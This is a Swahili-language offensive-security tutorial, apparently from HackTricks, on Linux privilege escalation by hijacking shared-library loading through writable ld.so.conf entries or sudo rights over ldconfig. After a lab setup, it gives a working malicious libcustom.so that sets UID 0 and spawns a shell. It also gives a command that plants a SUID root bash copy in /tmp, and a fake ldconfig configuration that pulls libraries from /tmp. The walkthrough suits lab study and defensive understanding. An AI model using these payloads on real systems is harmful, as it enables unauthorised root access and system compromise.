# Mfano wa exploit ya privesc ya ld.so

{{#include ../../banners/hacktricks-training.md}}

## Andaa mazingira

Katika sehemu ifuatayo unaweza kupata code ya files tutakazotumia kuandaa mazingira

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **Unda** faili hizo kwenye mashine yako katika folda hiyo hiyo
2. **Compile** **library**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Copy** `libcustom.so` hadi `/usr/lib` na refresh cache: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (root privs)
4. **Compile** **executable**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Kagua mazingira

Kagua kwamba _libcustom.so_ **imepakiwa** kutoka _/usr/lib_ na kwamba unaweza **ku-execute** binary.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### Amri muhimu za triage

Unaposhambulia target halisi, thibitisha **jina kamili la library** linalohitajika na binary na kile ambacho loader **inatafuta kwa sasa**:
```bash
readelf -d ./sharedvuln | grep NEEDED
ldconfig -p | grep libcustom
/lib64/ld-linux-x86-64.so.2 --list ./sharedvuln 2>/dev/null \
# x86_64; adjust for your arch
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'
```
Mambo kadhaa muhimu ya kuzingatia:

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` kwa kawaida **haifanyi kazi** kwa sababu uelekezaji wa output unafanywa na shell yako ya sasa. Tumia
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf` badala yake.
- Binaries za **SUID/privileged** hupuuza `LD_LIBRARY_PATH`/`LD_PRELOAD` katika
**secure-execution mode**, lakini directories zinazotoka kwenye `/etc/ld.so.conf` bado ni sehemu ya trusted loader configuration, hivyo misconfiguration hii bado inaweza kuathiri programu zenye privileges.<sup>[[1]](#references)</sup>
- Kwenye matoleo mapya ya glibc, dynamic loader pia inatoa
`--list-diagnostics`, ambayo ni muhimu kwa kutatua matatizo ya cache resolution na uteuzi wa subdirectory za `glibc-hwcaps` wakati hijack haifanyi kazi kama ilivyotarajiwa.<sup>[[1]](#references)</sup>

## Exploit

Katika hali hii tutachukulia kwamba **mtu ameunda entry yenye vulnerability** ndani ya file katika _/etc/ld.so.conf/_:
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
Folda iliyo hatarini ni _/home/ubuntu/lib_ (ambapo tuna access ya kuandika).\
**Download and compile** code ifuatayo ndani ya path hiyo:
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setuid(0);
setgid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
Ikiwa unatarajia **root** (au akaunti nyingine yenye privileges) ku-execute vulnerable binary baadaye, kwa kawaida ni bora kuacha **root-owned artifact** badala ya kuzindua interactive shell. Kwa mfano:
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
Kisha, baada ya utekekelezaji wenye mapendeleo kufanyika, unaweza kutumia `/tmp/rootbash -p`.

Sasa kwa kuwa **tumeunda library hasidi ya libcustom ndani ya** path **iliyowekwa vibaya**, tunahitaji kusubiri **reboot** au mtumiaji root atekeleze **`ldconfig`** (_ikiwa unaweza kutekeleza binary hii kama **sudo** au ina **suid bit**, utaweza kuitekeleza mwenyewe_).

Baada ya hili kutokea, **kagua tena** ni wapi executable ya `sharedvuln` inapakia library ya `libcustom.so` kutoka:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Kama unavyoona, **inaipakia kutoka `/home/ubuntu/lib`**, na mtumiaji yeyote akiitekeleza, shell itatekelezwa:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> Kumbuka kwamba katika mfano huu hatuja-escalate privileges, lakini kwa kubadilisha commands zinazotekelezwa na **kusubiri root au user mwingine mwenye privileges atekeleze vulnerable binary** tutaweza ku-escalate privileges.

### Maconfiguration mengine - Vuln hiyo hiyo

Katika mfano uliotangulia tulitengeneza maconfiguration ya uongo ambapo administrator **aliweka folder isiyo na privileges ndani ya configuration file iliyo ndani ya `/etc/ld.so.conf.d/`**.\
Lakini kuna maconfiguration nyingine zinazoweza kusababisha vulnerability hiyo hiyo; ikiwa una **write permissions** kwenye **config file** fulani iliyo ndani ya `/etc/ld.so.conf.d/`, kwenye folder `/etc/ld.so.conf.d` au kwenye file `/etc/ld.so.conf`, unaweza kusanidi vulnerability hiyo hiyo na ku-exploit.

## Exploit 2

**Tuseme una sudo privileges juu ya `ldconfig`**.\
Unaweza kuonyesha **mahali pa kupakia conf files kwa `ldconfig`**, hivyo tunaweza kutumia hilo kufanya `ldconfig` ipakie folders za kiholela.<sup>[[2]](#references)</sup>\
Kwa hiyo, hebu tutengeneze files na folders zinazohitajika kupakia "/tmp":
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Sasa, kama ilivyoonyeshwa kwenye **previous exploit**, **unda library hasidi ndani ya `/tmp`**.\
Na hatimaye, hebu tupakie path na tuangalie binary inapakia library kutoka wapi:
```bash
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Kama unavyoona, ukiwa na sudo privileges juu ya `ldconfig`, unaweza kutumia vulnerability hiyo hiyo.**

## Marejeo

- [1] [`ld.so(8)` - Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [`ldconfig(8)` - Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man8/ldconfig.8.html)

{{#include ../../banners/hacktricks-training.md}}
